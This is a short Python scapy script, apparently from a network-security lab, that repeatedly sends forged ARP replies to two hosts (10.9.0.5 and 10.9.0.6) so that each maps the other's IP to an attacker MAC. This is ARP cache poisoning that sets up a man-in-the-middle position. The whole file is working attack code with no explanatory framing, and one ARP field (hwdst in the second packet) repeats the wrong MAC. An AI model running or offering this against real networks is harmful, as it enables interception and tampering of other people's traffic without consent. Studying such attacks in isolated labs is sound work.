#!/usr/bin/env python3
from scapy.all import *

ethA = Ether(src='02:42:0a:09:00:69', dst='02:42:0a:09:00:05')
arpA = ARP(hwsrc='02:42:0a:09:00:69', psrc='10.9.0.6', hwdst='02:42:0a:09:00:05', pdst='10.9.0.5', op=2)

ethB = Ether(src='02:42:0a:09:00:69', dst='02:42:0a:09:00:06')
arpB = ARP(hwsrc='02:42:0a:09:00:69', psrc='10.9.0.5', hwdst='02:42:0a:09:00:05', pdst='10.9.0.6', op=2)

while True:
  pktA = ethA/arpA
  sendp(pktA, count=1)
  pktB = ethB/arpB
  sendp(pktB, count=1)
  time.sleep(5)
